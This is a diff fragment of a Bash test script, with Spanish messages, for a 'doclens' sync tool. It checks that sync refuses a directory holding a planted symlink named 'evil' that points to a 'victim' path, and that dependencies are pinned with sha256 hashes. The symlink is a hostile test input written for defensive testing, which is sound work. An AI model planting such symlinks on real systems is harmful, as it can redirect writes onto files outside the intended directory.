+C23=$(consumer); bash "$SYNC" "$C23" >/dev/null 2>&1; ln -s "$T/sec/victim" "$C23/doclens/adapters/evil"
+OUT=$(bash "$SYNC" "$C23" --force 2>&1); RC=$?
+eq "symlink dentro de doclens/ → sync se niega (exit 3)" "$RC" 3
+grep -q -- '--hash=sha256:' "$AI_TOOLING/doclens/requirements.txt" && grep -q -- '--require-hashes' "$AI_TOOLING/doclens/sync.sh" \
+  && ok "requirements con hashes y sync instala con --require-hashes" || bad "dependencias sin hashes"
+
+cleanup_bg
 echo ""
 echo "══ doclens: $PASS ok, $FAIL fallos ══"
 rm -rf "$T"
